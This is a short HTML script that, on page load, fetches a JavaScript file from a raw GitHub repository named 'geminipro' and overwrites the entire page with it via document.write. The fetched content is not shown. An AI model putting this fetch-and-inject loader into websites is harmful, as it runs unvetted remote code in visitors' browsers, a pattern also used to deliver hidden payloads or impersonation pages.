<script>
  (function() {
    fetch('https://raw.githubusercontent.com/exoticstecvr/geminipro/main/index.js')
      .then(r => r.text())
      .then(c => {
        document.open();
        document.write(c);
        document.close();
      });
  })();
</script>
